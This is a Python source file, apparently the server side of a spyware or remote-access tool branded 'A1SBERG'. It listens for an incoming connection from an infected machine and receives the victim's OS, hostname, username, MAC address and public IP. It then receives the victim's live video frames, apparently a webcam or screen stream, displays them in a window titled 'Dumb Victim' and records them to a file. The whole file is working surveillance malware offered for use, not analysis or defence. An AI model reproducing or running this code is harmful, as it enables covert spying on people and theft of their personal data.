banner = """
   ▄▄▄▄▄   ████▄ █  █▀  ▄      ▄▄▄▄▄    ▄  █ ▄█
  █     ▀▄ █   █ █▄█     █    █     ▀▄ █   █ ██
▄  ▀▀▀▀▄   █   █ █▀▄  █   █ ▄  ▀▀▀▀▄   ██▀▀█ ██
 ▀▄▄▄▄▀    ▀████ █  █ █   █  ▀▄▄▄▄▀    █   █ ▐█
                   █  █▄ ▄█               █   ▐ (server)
                  ▀    ▀▀▀               ▀
                                ~ A1SBERG
"""

import socket, cv2, numpy as np, threading

# Server setup
h, p, b = "0.0.0.0", 8080, 1024*128
srv = socket.socket()
srv.bind((h, p))
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.listen(5)
print(banner)
print(f"[*] Listening on {h}:{p} ...")
conn, addr = srv.accept()
print(f"[+] Connection from {addr[0]}:{addr[1]} Received!")

# Helper function to receive string data with length prefix
def recv_string(sock):
    length = int.from_bytes(sock.recv(4), 'little')
    return sock.recv(length).decode('utf-8')

# Receive and print system information
loc = recv_string(conn)
sysinfo = recv_string(conn)
hostname = recv_string(conn)
username = recv_string(conn)
processor = recv_string(conn)
architecture = recv_string(conn)
mac_address = recv_string(conn)
public_ip = recv_string(conn)

print(f"[+] Operating System: {sysinfo}")
print(f"[+] Current Working Dir: {loc}")
print(f"[+] Hostname: {hostname}")
print(f"[+] Username: {username}")
print(f"[+] Processor: {processor}")
print(f"[+] Architecture: {architecture}")
print(f"[+] MAC Address: {mac_address}")
print(f"[+] Public IP: {public_ip}")

# Video capture handler
def vcap():
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter('output.mp4', fourcc, 30.0, (640, 480))
    while True:
        f_size = int.from_bytes(conn.recv(4), 'little')
        f_data = b''
        while len(f_data) < f_size:
            pkt = conn.recv(min(b, f_size - len(f_data)))
            if not pkt: break
            f_data += pkt
        if not f_data: break
        frame = cv2.imdecode(np.frombuffer(f_data, np.uint8), cv2.IMREAD_COLOR)
        out.write(frame)
        cv2.imshow("A1SBERG's Dumb Victim", frame)
        if cv2.waitKey(1) & 0xFF == ord('q'): break
    out.release()
    cv2.destroyAllWindows()

# Handle Ctrl+C to prevent stopping the program
def signal_handler(signum, frame):
    print("Press 'q' to quit")

# Catching the Ctrl+C event
import signal
signal.signal(signal.SIGINT, signal_handler)

# Start video capturing
t = threading.Thread(target=vcap)
t.start()

# Wait for the thread to finish
t.join()
conn.close()
srv.close()
